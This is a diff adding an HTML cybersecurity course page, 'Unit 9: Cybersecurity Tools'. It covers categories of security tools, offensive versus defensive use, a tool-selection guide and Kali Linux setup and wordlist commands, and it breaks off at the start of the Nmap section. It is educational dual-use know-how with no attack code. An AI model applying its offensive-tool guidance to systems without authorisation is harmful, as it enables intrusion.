@@ -1,0 +1,1629 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Unit 9: Cybersecurity Tools — Complete Study Guide</title>
+<link href="https://fonts.googleapis.com/css2?family=Industry:wght@400;700&family=JetBrains+Mono:wght@400;500;700&family=Nunito:wght@400;600;700;800&family=Archivo+Black&display=swap" rel="stylesheet"/>
+<style>
+:root{
+  --bg:#04080d;--bg-card:#08111a;--bg-panel:#0d1a26;
+  --steel:#4a9eff;--steel2:#2d7dd2;--cyan:#00f5d4;
+  --lime:#b2ff59;--orange:#ff6d00;--yellow:#ffea00;
+  --pink:#ff4081;--purple:#7c4dff;--red:#ff1744;
+  --text:#dce8f5;--dim:#2a4a6a;
+  --border:rgba(74,158,255,0.18);--glow:0 0 22px rgba(74,158,255,0.32);
+  --glow-c:0 0 18px rgba(0,245,212,0.28);
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--text);font-family:'Nunito',sans-serif;overflow-x:hidden;}
+body::before{content:'';position:fixed;inset:0;
+  background:radial-gradient(ellipse at 15% 25%,rgba(74,158,255,0.07) 0%,transparent 50%),
+             radial-gradient(ellipse at 85% 75%,rgba(0,245,212,0.05) 0%,transparent 50%);
+  pointer-events:none;z-index:0;}
+body::after{content:'';position:fixed;inset:0;
+  background-image:repeating-linear-gradient(0deg,transparent,transparent 39px,rgba(74,158,255,0.025) 40px),
+    repeating-linear-gradient(90deg,transparent,transparent 39px,rgba(74,158,255,0.025) 40px);
+  pointer-events:none;z-index:0;}
+canvas#bg{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.18;}
+
+/* HEADER */
+header{position:relative;z-index:10;text-align:center;padding:55px 20px 40px;
+  background:linear-gradient(180deg,rgba(4,8,13,0.98) 0%,transparent 100%);
+  border-bottom:1px solid var(--border);}
+.ubadge{display:inline-flex;align-items:center;gap:8px;font-family:'JetBrains Mono',monospace;
+  font-size:.68rem;letter-spacing:4px;text-transform:uppercase;color:var(--steel);
+  border:1px solid rgba(74,158,255,0.35);padding:6px 18px;border-radius:2px;
+  margin-bottom:18px;box-shadow:var(--glow);}
+header h1{font-family:'Archivo Black',sans-serif;font-size:clamp(2rem,5.5vw,4rem);
+  background:linear-gradient(135deg,var(--steel) 0%,var(--cyan) 40%,var(--lime) 70%,var(--yellow) 100%);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
+  line-height:1.1;margin-bottom:8px;}
+header p.sub{font-family:'JetBrains Mono',monospace;color:var(--dim);font-size:.84rem;letter-spacing:3px;}
+.hstats{display:flex;justify-content:center;gap:18px;margin-top:22px;flex-wrap:wrap;}
+.hs{background:rgba(74,158,255,0.07);border:1px solid var(--border);border-radius:8px;padding:10px 18px;text-align:center;}
+.hs .n{font-family:'Archivo Black',sans-serif;font-size:1.5rem;color:var(--steel);}
+.hs .l{font-size:.66rem;color:var(--dim);letter-spacing:2px;text-transform:uppercase;margin-top:2px;}
+
+.wrap{max-width:1200px;margin:0 auto;padding:0 20px;position:relative;z-index:5;}
+
+/* TOC */
+.toc-g{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:8px;margin:14px 0 26px;}
+.ti{display:flex;align-items:center;gap:10px;background:var(--bg-card);border:1px solid var(--border);
+  border-radius:8px;padding:10px 13px;text-decoration:none;color:var(--text);transition:all .3s;cursor:pointer;}
+.ti:hover{border-color:var(--steel);background:rgba(74,158,255,0.09);transform:translateX(4px);box-shadow:var(--glow);}
+.tn{font-family:'JetBrains Mono',monospace;font-size:.72rem;color:var(--cyan);min-width:28px;}
+.tt{font-size:.85rem;font-weight:600;}
+
+/* TOOL HERO CARD */
+.tool-hero{background:linear-gradient(135deg,var(--bg-panel),rgba(74,158,255,0.06));
+  border:1px solid var(--border);border-radius:14px;padding:20px 24px;margin:16px 0;
+  display:grid;grid-template-columns:auto 1fr auto;gap:16px;align-items:center;}
+.tool-icon{font-size:3rem;}
+.tool-info .tool-name{font-family:'Archivo Black',sans-serif;font-size:1.6rem;color:var(--steel);margin-bottom:3px;}
+.tool-info .tool-cat{font-family:'JetBrains Mono',monospace;font-size:.68rem;letter-spacing:3px;color:var(--cyan);text-transform:uppercase;}
+.tool-info .tool-desc{font-size:.9rem;color:#8ab8d8;margin-top:6px;}
+.tool-stats{display:flex;flex-direction:column;gap:8px;align-items:flex-end;}
+.stat-pill{font-family:'JetBrains Mono',monospace;font-size:.65rem;padding:4px 12px;border-radius:20px;
+  white-space:nowrap;letter-spacing:1px;}
+.sp-free{background:rgba(178,255,89,0.1);color:var(--lime);border:1px solid rgba(178,255,89,0.25);}
+.sp-paid{background:rgba(255,109,0,0.1);color:var(--orange);border:1px solid rgba(255,109,0,0.25);}
+.sp-os{background:rgba(0,245,212,0.09);color:var(--cyan);border:1px solid rgba(0,245,212,0.22);}
+
+/* SECTIONS */
+.sec{margin:28px 0;background:var(--bg-card);border:1px solid var(--border);border-radius:16px;overflow:hidden;position:relative;}
+.sec::before{content:'';position:absolute;left:0;top:0;bottom:0;width:4px;background:linear-gradient(180deg,var(--steel),var(--cyan));}
+.sh{padding:20px 24px 15px 32px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:12px;flex-wrap:wrap;}
+.sn{font-family:'JetBrains Mono',monospace;font-size:.74rem;color:var(--cyan);
+  background:rgba(0,245,212,0.08);border:1px solid rgba(0,245,212,0.22);padding:4px 9px;border-radius:4px;white-space:nowrap;}
+.sh h2{font-family:'Archivo Black',sans-serif;font-size:clamp(1.2rem,2.8vw,1.75rem);color:var(--steel);}
+.se{font-size:1.6rem;margin-left:auto;}
+.sb{padding:20px 24px 24px 32px;}
+
+/* SUBSECTIONS */
+.sub{margin-bottom:22px;}
+.sub h3{font-family:'JetBrains Mono',monospace;font-size:.95rem;font-weight:700;color:var(--cyan);
+  margin-bottom:9px;display:flex;align-items:center;gap:8px;letter-spacing:.5px;}
+.sub h3::before{content:'//';color:var(--orange);font-size:.8rem;}
+p{line-height:1.72;color:#8ab8d8;margin-bottom:8px;font-size:.93rem;}
+strong{color:var(--yellow);font-weight:700;}
+
+/* ONE-LINE */
+.oneliner{background:rgba(0,245,212,0.06);border:1px solid rgba(0,245,212,0.2);
+  border-radius:8px;padding:9px 13px;margin:10px 0;font-size:.82rem;
+  font-family:'JetBrains Mono',monospace;color:#a0ffe8;line-height:1.6;}
+.ol-lbl{font-size:.6rem;letter-spacing:3px;color:var(--cyan);text-transform:uppercase;margin-bottom:4px;font-weight:700;}
+
+/* DEF */
+.def{background:rgba(74,158,255,0.07);border:1px solid rgba(74,158,255,0.22);
+  border-left:3px solid var(--steel);border-radius:8px;padding:12px 16px;margin:10px 0;font-size:.91rem;line-height:1.7;}
+.dl{font-family:'JetBrains Mono',monospace;font-size:.62rem;font-weight:700;letter-spacing:3px;color:var(--steel);text-transform:uppercase;margin-bottom:5px;}
+
+/* TERMINAL */
+.terminal{background:#020408;border:1px solid rgba(0,245,212,0.22);border-radius:10px;margin:11px 0;overflow:hidden;}
+.thd{background:rgba(0,245,212,0.06);padding:7px 12px;display:flex;align-items:center;gap:8px;border-bottom:1px solid rgba(0,245,212,0.13);}
+.tdots{display:flex;gap:5px;}
+.tdots span{width:9px;height:9px;border-radius:50%;}
+.tdots .r{background:#ff5f56;}.tdots .y{background:#ffbd2e;}.tdots .g{background:#27c93f;}
+.ttl{font-family:'JetBrains Mono',monospace;font-size:.63rem;color:rgba(0,245,212,0.5);letter-spacing:2px;margin-left:5px;}
+.tbody{padding:13px 15px;overflow-x:auto;}
+.tbody pre{font-family:'JetBrains Mono',monospace;font-size:.76rem;line-height:1.85;white-space:pre;}
+.p{color:#00f5d4;}.cmd{color:#fff;}.out{color:#5ab0a0;}
+.err{color:#ff1744;}.fl{color:#ffea00;}.ip{color:#4a9eff;}.cm{color:#1a3a4a;}
+.hl{color:#b2ff59;}.hlo{color:#ff6d00;}.hlp{color:#c084fc;}
+
+/* CODE */
+.cb{background:#020408;border:1px solid rgba(74,158,255,0.17);border-radius:10px;
+  padding:14px;margin:10px 0;overflow-x:auto;position:relative;}
+.clbl{position:absolute;top:6px;right:10px;font-family:'JetBrains Mono',monospace;
+  font-size:.59rem;letter-spacing:2px;color:var(--steel);opacity:.5;text-transform:uppercase;}
+.cb pre{font-family:'JetBrains Mono',monospace;font-size:.76rem;line-height:1.7;color:#8ab8d8;white-space:pre;}
+.cg{color:#b2ff59;}.cy{color:#ffea00;}.co{color:#ff6d00;}.ci{color:#00f5d4;}
+.cp{color:#c084fc;}.cr{color:#ff1744;}.cd{color:#1a3a4a;}.cw{color:#dce8f5;}
+
+/* TABLES */
+.tw{overflow-x:auto;margin:11px 0;border-radius:10px;border:1px solid var(--border);}
+table{width:100%;border-collapse:collapse;font-size:.83rem;}
+thead{background:linear-gradient(90deg,rgba(74,158,255,0.13),rgba(0,245,212,0.07));}
+thead th{padding:10px 13px;text-align:left;font-family:'JetBrains Mono',monospace;
+  font-size:.68rem;font-weight:700;letter-spacing:2px;color:var(--cyan);
+  text-transform:uppercase;border-bottom:1px solid var(--border);white-space:nowrap;}
+tbody tr{border-bottom:1px solid rgba(74,158,255,0.06);transition:background .2s;}
+tbody tr:hover{background:rgba(74,158,255,0.05);}
+tbody td{padding:9px 13px;color:#8ab8d8;vertical-align:top;line-height:1.5;}
+tbody td:first-child{color:var(--yellow);font-weight:700;}
+
+/* CARDS */
+.cg2{display:grid;grid-template-columns:repeat(auto-fill,minmax(175px,1fr));gap:11px;margin:11px 0;}
+.card{background:var(--bg-panel);border:1px solid var(--border);border-radius:10px;padding:14px;transition:all .3s;}
+.card:hover{border-color:var(--steel);transform:translateY(-3px);box-shadow:var(--glow);}
+.ci2{font-size:1.5rem;margin-bottom:7px;}
+.ct{font-family:'Archivo Black',sans-serif;font-size:.9rem;color:var(--cyan);margin-bottom:4px;}
+.cd2{font-size:.78rem;color:var(--dim);line-height:1.5;}
+
+/* COMPARE */
+.cmp{display:grid;grid-template-columns:1fr 1fr;gap:11px;margin:11px 0;}
+.cp2{background:var(--bg-panel);border:1px solid var(--border);border-radius:10px;padding:13px;}
+.cp2 h4{font-family:'JetBrains Mono',monospace;font-size:.85rem;font-weight:700;
+  margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid var(--border);letter-spacing:.5px;}
+.cp2.s h4{color:var(--steel);}
+.cp2.c h4{color:var(--cyan);}
+.cp2.l h4{color:var(--lime);}
+.cp2.o h4{color:var(--orange);}
+.cp2.p h4{color:var(--purple);}
+.cp2.r h4{color:var(--red);}
+.cp2 ul{list-style:none;padding:0;}
+.cp2 ul li{font-size:.8rem;color:#8ab8d8;padding:4px 0;border-bottom:1px solid rgba(255,255,255,.04);display:flex;gap:7px;}
+.cp2 ul li::before{content:'→';color:var(--dim);flex-shrink:0;}
+
+/* INFO */
+.ib{border-radius:10px;padding:11px 15px;margin:10px 0;display:flex;gap:11px;align-items:flex-start;font-size:.85rem;line-height:1.65;}
+.ib.s{background:rgba(74,158,255,0.07);border:1px solid rgba(74,158,255,0.22);}
+.ib.c{background:rgba(0,245,212,0.06);border:1px solid rgba(0,245,212,0.2);color:#a0ffe8;}
+.ib.l{background:rgba(178,255,89,0.06);border:1px solid rgba(178,255,89,0.2);color:#d0ffb0;}
+.ib.o{background:rgba(255,109,0,0.07);border:1px solid rgba(255,109,0,0.22);color:#ffc088;}
+.ib.r{background:rgba(255,23,68,0.07);border:1px solid rgba(255,23,68,0.22);color:#ffb0b8;}
+.ib.p{background:rgba(124,77,255,0.07);border:1px solid rgba(124,77,255,0.22);color:#d0c0ff;}
+.bi{font-size:1.2rem;flex-shrink:0;margin-top:2px;}
+
+/* EXERCISE */
+.ex{background:rgba(74,158,255,0.05);border:1px solid rgba(74,158,255,0.2);border-radius:10px;padding:13px 16px;margin:11px 0;}
+.el{font-family:'JetBrains Mono',monospace;font-size:.62rem;font-weight:700;letter-spacing:3px;color:var(--steel);text-transform:uppercase;margin-bottom:8px;display:flex;align-items:center;gap:7px;}
+.ex ol{padding-left:18px;}
+.ex ol li{font-size:.83rem;color:#8ab8d8;margin-bottom:7px;line-height:1.6;}
+
+/* CONCL */
+.concl{margin-top:20px;background:linear-gradient(135deg,rgba(74,158,255,0.06),rgba(0,245,212,0.04));
+  border:1px solid rgba(74,158,255,0.18);border-radius:10px;padding:13px 16px;}
+.cl{font-family:'JetBrains Mono',monospace;font-size:.62rem;letter-spacing:3px;color:var(--steel);text-transform:uppercase;margin-bottom:5px;}
+
+/* SGT */
+.sgt{font-family:'JetBrains Mono',monospace;font-size:.69rem;font-weight:700;letter-spacing:4px;
+  color:var(--dim);text-transform:uppercase;padding:22px 0 10px;display:flex;align-items:center;gap:12px;}
+.sgt::after{content:'';flex:1;height:1px;background:var(--border);}
+.div{height:1px;background:linear-gradient(90deg,transparent,var(--steel),transparent);margin:7px 0 20px;opacity:.2;}
+
+/* BADGE */
+.badge{display:inline-flex;align-items:center;gap:4px;font-family:'JetBrains Mono',monospace;
+  font-size:.6rem;padding:2px 8px;border-radius:3px;margin-left:6px;letter-spacing:1px;}
+.b-g{background:rgba(178,255,89,0.1);color:var(--lime);border:1px solid rgba(178,255,89,0.25);}
+.b-r{background:rgba(255,23,68,0.1);color:var(--red);border:1px solid rgba(255,23,68,0.25);}
+.b-s{background:rgba(74,158,255,0.1);color:var(--steel);border:1px solid rgba(74,158,255,0.25);}
+.b-o{background:rgba(255,109,0,0.1);color:var(--orange);border:1px solid rgba(255,109,0,0.25);}
+
+/* REVISION */
+.rv{display:grid;grid-template-columns:repeat(auto-fill,minmax(255px,1fr));gap:8px;margin:11px 0;}
+.ri{background:var(--bg-panel);border:1px solid var(--border);border-radius:8px;padding:10px 12px;display:flex;gap:10px;}
+.rt{font-family:'JetBrains Mono',monospace;font-size:.68rem;font-weight:700;color:var(--cyan);min-width:110px;padding-top:1px;}
+.rd{font-size:.78rem;color:#2a4a6a;line-height:1.5;}
+
+/* PILLS */
+.pills{display:flex;flex-wrap:wrap;gap:7px;margin:10px 0;}
+.pill{font-family:'JetBrains Mono',monospace;font-size:.74rem;padding:4px 12px;
+  border-radius:20px;background:rgba(74,158,255,0.08);border:1px solid rgba(74,158,255,0.2);color:var(--steel);}
+.pill.c{background:rgba(0,245,212,0.08);border-color:rgba(0,245,212,0.2);color:var(--cyan);}
+.pill.l{background:rgba(178,255,89,0.08);border-color:rgba(178,255,89,0.2);color:var(--lime);}
+.pill.o{background:rgba(255,109,0,0.08);border-color:rgba(255,109,0,0.2);color:var(--orange);}
+.pill.r{background:rgba(255,23,68,0.08);border-color:rgba(255,23,68,0.2);color:var(--red);}
+.pill.p{background:rgba(124,77,255,0.08);border-color:rgba(124,77,255,0.2);color:var(--purple);}
+
+/* TOOL COMPARISON GRID */
+.tool-cmp{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;margin:12px 0;}
+.tc{background:var(--bg-panel);border:1px solid var(--border);border-radius:10px;padding:15px;transition:all .3s;}
+.tc:hover{border-color:var(--steel);box-shadow:var(--glow);transform:translateY(-2px);}
+.tc-name{font-family:'Archivo Black',sans-serif;font-size:1.1rem;color:var(--steel);margin-bottom:3px;}
+.tc-type{font-family:'JetBrains Mono',monospace;font-size:.62rem;letter-spacing:2px;color:var(--cyan);margin-bottom:8px;}
+.tc-body{font-size:.79rem;color:var(--dim);line-height:1.5;}
+.tc-score{display:flex;align-items:center;gap:6px;margin-top:8px;}
+.tc-bar{flex:1;height:4px;background:rgba(74,158,255,0.15);border-radius:2px;overflow:hidden;}
+.tc-fill{height:100%;border-radius:2px;background:linear-gradient(90deg,var(--steel),var(--cyan));}
+
+::-webkit-scrollbar{width:5px;height:5px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:rgba(74,158,255,.25);border-radius:3px;}
+@media(max-width:640px){.sb,.sh{padding-left:16px;padding-right:12px;}.cmp{grid-template-columns:1fr;}.tool-hero{grid-template-columns:1fr;}}
+</style>
+</head>
+<body>
+<canvas id="bg"></canvas>
+
+<header>
+  <div class="ubadge">⚙️ Cybersecurity Course · Unit 9</div>
+  <h1>Cybersecurity Tools</h1>
+  <p class="sub">// TOPICS 149 — 164 · COMPLETE TOOL MASTERY GUIDE</p>
+  <div class="hstats">
+    <div class="hs"><div class="n">16</div><div class="l">Topics</div></div>
+    <div class="hs"><div class="n">30+</div><div class="l">Tools Covered</div></div>
+    <div class="hs"><div class="n">SIEM</div><div class="l">Detection</div></div>
+    <div class="hs"><div class="n">ELK</div><div class="l">Log Analysis</div></div>
+    <div class="hs"><div class="n">Splunk</div><div class="l">Enterprise SOC</div></div>
+  </div>
+</header>
+
+<div class="wrap">
+<div class="sgt">📋 Table of Contents</div>
+<div class="toc-g">
+  <a href="#t149" class="ti"><span class="tn">149</span><span class="tt">Introduction to Security Tools</span></a>
+  <a href="#t150" class="ti"><span class="tn">150</span><span class="tt">Kali Linux</span></a>
+  <a href="#t151" class="ti"><span class="tn">151</span><span class="tt">Nmap</span></a>
+  <a href="#t152" class="ti"><span class="tn">152</span><span class="tt">Wireshark</span></a>
+  <a href="#t153" class="ti"><span class="tn">153</span><span class="tt">Metasploit</span></a>
+  <a href="#t154" class="ti"><span class="tn">154</span><span class="tt">Burp Suite</span></a>
+  <a href="#t155" class="ti"><span class="tn">155</span><span class="tt">SIEM Basics 🔥</span></a>
+  <a href="#t156" class="ti"><span class="tn">156</span><span class="tt">Splunk 🔥</span></a>
+  <a href="#t157" class="ti"><span class="tn">157</span><span class="tt">ELK Stack 🔥</span></a>
+  <a href="#t158" class="ti"><span class="tn">158</span><span class="tt">Vulnerability Scanners</span></a>
+  <a href="#t159" class="ti"><span class="tn">159</span><span class="tt">Password Cracking Tools</span></a>
+  <a href="#t160" class="ti"><span class="tn">160</span><span class="tt">Monitoring Tools</span></a>
+  <a href="#t161" class="ti"><span class="tn">161</span><span class="tt">Automation Tools</span></a>
+  <a href="#t162" class="ti"><span class="tn">162</span><span class="tt">Tool Comparison</span></a>
+  <a href="#t163" class="ti"><span class="tn">163</span><span class="tt">Real-world Usage</span></a>
+  <a href="#t164" class="ti"><span class="tn">164</span><span class="tt">Unit 9 Revision Notes</span></a>
+</div>
+
+<!-- ===== T149 ===== -->
+<div class="sgt">⚙️ Foundation</div>
+<div class="sec" id="t149">
+  <div class="sh"><span class="sn">Topic 149</span><h2>Introduction to Security Tools</h2><span class="se">⚙️</span></div>
+  <div class="sb">
+    <div class="oneliner"><div class="ol-lbl">⚡ Summary</div>Security tools are software programs that help security professionals detect, analyse, prevent, and respond to threats — spanning offensive (pen testing) to defensive (monitoring, SIEM) categories. Choosing the right tool for the right task is the core skill.</div>
+    <div class="sub"><h3>Tool Categories</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Category</th><th>Purpose</th><th>Key Tools</th><th>Used By</th></tr></thead>
+        <tbody>
+          <tr><td>Reconnaissance</td><td>Gather intelligence on targets</td><td>nmap, Shodan, Maltego, theHarvester</td><td>Pen testers, Red team</td></tr>
+          <tr><td>Vulnerability Scanning</td><td>Find known CVEs automatically</td><td>Nessus, OpenVAS, Qualys, Nuclei</td><td>Security teams, DevSecOps</td></tr>
+          <tr><td>Exploitation</td><td>Exploit discovered vulnerabilities</td><td>Metasploit, Cobalt Strike, SQLmap</td><td>Pen testers, Red team</td></tr>
+          <tr><td>Web App Testing</td><td>Test HTTP/HTTPS applications</td><td>Burp Suite, OWASP ZAP, ffuf</td><td>Web pen testers, developers</td></tr>
+          <tr><td>Network Analysis</td><td>Capture and analyse packets</td><td>Wireshark, tcpdump, Zeek, Arkime</td><td>SOC analysts, forensics</td></tr>
+          <tr><td>SIEM/Log Analysis</td><td>Centralise and correlate security logs</td><td>Splunk, ELK Stack, QRadar, Sentinel</td><td>SOC analysts, blue team</td></tr>
+          <tr><td>Password Cracking</td><td>Recover passwords from hashes</td><td>Hashcat, John the Ripper, Hydra</td><td>Pen testers, forensics</td></tr>
+          <tr><td>Wireless Security</td><td>Test WiFi networks</td><td>Aircrack-ng, Kismet, Wifite</td><td>Wireless pen testers</td></tr>
+          <tr><td>Endpoint Security</td><td>Protect and monitor endpoints</td><td>CrowdStrike, SentinelOne, ClamAV, Lynis</td><td>Blue team, IT security</td></tr>
+          <tr><td>Automation/Scripting</td><td>Automate repetitive security tasks</td><td>Python, Ansible, Terraform, Bash</td><td>All security professionals</td></tr>
+          <tr><td>Threat Intelligence</td><td>Share and consume threat data</td><td>MISP, OpenCTI, VirusTotal</td><td>SOC, CERT, threat hunters</td></tr>
+          <tr><td>Forensics</td><td>Investigate incidents, recover evidence</td><td>Autopsy, Volatility, FTK, Sleuth Kit</td><td>DFIR investigators</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="sub"><h3>Offensive vs Defensive Tools</h3>
+      <div class="cmp">
+        <div class="cp2 r"><h4>⚔️ Offensive Tools (Red Team / Pen Test)</h4><ul>
+          <li>Used to simulate attacks and find vulnerabilities</li>
+          <li>Require explicit written authorisation</li>
+          <li>Examples: Metasploit, Burp Suite, Hydra</li>
+          <li>Goal: find weaknesses before real attackers</li>
+          <li>Used by: pen testers, red teams, bug hunters</li>
+        </ul></div>
+        <div class="cp2 s"><h4>🛡️ Defensive Tools (Blue Team / SOC)</h4><ul>
+          <li>Used to detect, monitor, and respond to attacks</li>
+          <li>Always authorised by the organisation</li>
+          <li>Examples: Splunk, ELK Stack, Wireshark, EDR</li>
+          <li>Goal: detect and stop attacks in real time</li>
+          <li>Used by: SOC analysts, incident responders, sysadmins</li>
+        </ul></div>
+      </div>
+    </div>
+    <div class="sub"><h3>Tool Selection Framework</h3>
+      <div class="cb"><div class="clbl">CHOOSING THE RIGHT TOOL</div><pre><span class="cy">Task → Tool Selection Decision Tree:</span>
+
+<span class="cg">"I need to scan a network for open ports"</span>         → nmap
+<span class="cg">"I need to find web app vulnerabilities"</span>          → Burp Suite + sqlmap
+<span class="cg">"I need to exploit a known CVE"</span>                   → Metasploit
+<span class="cg">"I need to analyse suspicious network traffic"</span>    → Wireshark + Zeek
+<span class="cg">"I need to search security logs for an incident"</span>  → Splunk / ELK
+<span class="cg">"I need to crack a password hash"</span>                 → Hashcat (GPU) / John (CPU)
+<span class="cg">"I need to scan for CVEs across my infrastructure"</span> → Nessus / Qualys / OpenVAS
+<span class="cg">"I need to test WiFi security"</span>                    → Aircrack-ng
+<span class="cg">"I need to gather OSINT on a target"</span>              → theHarvester + Maltego
+<span class="cg">"I need to automate security checks"</span>              → Python + Ansible + custom scripts
+
+<span class="cy">Evaluation criteria:</span>
+1. Open source vs commercial (cost vs support)
+2. CLI vs GUI (scripting vs ease of use)
+3. Active vs passive (detectable vs undetectable)
+4. Real-time vs offline (live vs recorded data)
+5. Legal requirements for your jurisdiction</pre></div>
+    </div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>No single tool does everything. A cybersecurity professional needs to know the right tool for each job — and more importantly, understand what each tool does under the hood. Tools are enablers of understanding, not substitutes for it.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T150 ===== -->
+<div class="sec" id="t150">
+  <div class="sh"><span class="sn">Topic 150</span><h2>Kali Linux</h2><span class="se">🐉</span></div>
+  <div class="sb">
+    <div class="tool-hero">
+      <div class="tool-icon">🐉</div>
+      <div class="tool-info">
+        <div class="tool-name">Kali Linux</div>
+        <div class="tool-cat">OFFENSIVE SECURITY · PENETRATION TESTING OS</div>
+        <div class="tool-desc">Debian-based Linux distro by Offensive Security. Ships with 600+ pre-installed security tools. The industry standard operating system for penetration testers, red teamers, and security researchers.</div>
+      </div>
+      <div class="tool-stats">
+        <span class="stat-pill sp-free">✓ FREE &amp; OPEN SOURCE</span>
+        <span class="stat-pill sp-os">Debian-based</span>
+        <span class="stat-pill sp-os">600+ tools</span>
+      </div>
+    </div>
+    <div class="terminal">
+      <div class="thd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttl">KALI LINUX — ESSENTIAL COMMANDS &amp; SETUP</div></div>
+      <div class="tbody"><pre><span class="cm">━━━ INITIAL SETUP ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt update && sudo apt full-upgrade -y</span>      <span class="cm"># Update everything</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install kali-linux-everything</span>          <span class="cm"># Install all 600+ tools</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">kali-tweaks</span>                                     <span class="cm"># Configure Kali settings</span>
+
+<span class="cm">━━━ KALI EDITIONS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="fl">kali-linux-default</span>     <span class="cm"># ~20 most-used tools (minimal footprint)</span>
+<span class="fl">kali-linux-headless</span>    <span class="cm"># No GUI — servers, CI/CD pipelines</span>
+<span class="fl">kali-linux-everything</span>  <span class="cm"># All 600+ tools (15GB)</span>
+<span class="fl">kali-linux-large</span>       <span class="cm"># Top tools without extras</span>
+
+<span class="cm">━━━ TOOL CATEGORIES (packages) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install kali-tools-information-gathering</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install kali-tools-vulnerability</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install kali-tools-exploitation</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install kali-tools-web</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install kali-tools-wireless</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install kali-tools-passwords</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install kali-tools-forensics</span>
+
+<span class="cm">━━━ KALI AS DOCKER CONTAINER ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">docker pull kalilinux/kali-rolling</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">docker run -it kalilinux/kali-rolling /bin/bash</span>
+
+<span class="cm">━━━ WSL2 (Windows Subsystem for Linux) ━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># PowerShell (Admin):</span>
+<span class="out">PS&gt; wsl --install -d kali-linux</span>
+<span class="out">PS&gt; wsl -d kali-linux</span>
+
+<span class="cm">━━━ KEY WORDLISTS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">ls /usr/share/wordlists/</span>
+<span class="out">rockyou.txt.gz  dirbuster/  seclists/  dirb/  metasploit/</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">gunzip /usr/share/wordlists/rockyou.txt.gz</span>        <span class="cm"># Extract rockyou (14.3M passwords)</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install seclists</span>                        <span class="cm"># Install SecLists (best wordlist collection)</span></pre></div>
+    </div>
+    <div class="sub"><h3>Kali vs ParrotOS vs BlackArch</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Distro</th><th>Base</th><th>Tools</th><th>Best For</th><th>Resource Use</th></tr></thead>
+        <tbody>
+          <tr><td>Kali Linux</td><td>Debian Testing</td><td>600+</td><td>Industry standard, pen testing</td><td>Medium-High</td></tr>
+          <tr><td>ParrotOS</td><td>Debian Stable</td><td>400+</td><td>Privacy + development + security</td><td>Low-Medium</td></tr>
+          <tr><td>BlackArch</td><td>Arch Linux</td><td>2,800+</td><td>Advanced users, maximum tools</td><td>High</td></tr>
+          <tr><td>Kali Purple</td><td>Debian Testing</td><td>100+ defensive</td><td>Blue team, SOC, defensive ops</td><td>Medium</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Kali Linux is the foundation of modern penetration testing. Its maintained tool ecosystem, documentation, and community make it the default choice for security professionals. Master the OS itself: package management, service management, scripting — before relying on the tools within it.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T151 ===== -->
+<div class="sgt">🔍 Scanning &amp; Network Tools</div>
+<div class="sec" id="t151">
+  <div class="sh"><span class="sn">Topic 151</span><h2>Nmap — Network Mapper</h2><span class="se">🗺️</span></div>
+  <div class="sb">
+    <div class="tool-hero">
+      <div class="tool-icon">🗺️</div>
+      <div class="tool-info">
+        <div class="tool-name">Nmap</div>
+        <div class="tool-cat">NETWORK SCANNING · PORT DISCOVERY · SERVICE DETECTION</div>
+        <div class="tool-desc">The world's most popular network scanner. Discovers hosts, open ports, running services, OS fingerprints, and known vulnerabilities. Created by Gordon Lyon (Fyodor) in 1997. Used in every penetration test and network audit.</div>
+      </div>
+      <div class="tool-stats">
+        <span class="stat-pill sp-free">✓ FREE / OPEN SOURCE</span>
+        <span class="stat-pill sp-os">nmap.org</span>
+      </div>
+    </div>
+    <div class="terminal">
+      <div class="thd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttl">NMAP — COMPLETE COMMAND REFERENCE</div></div>
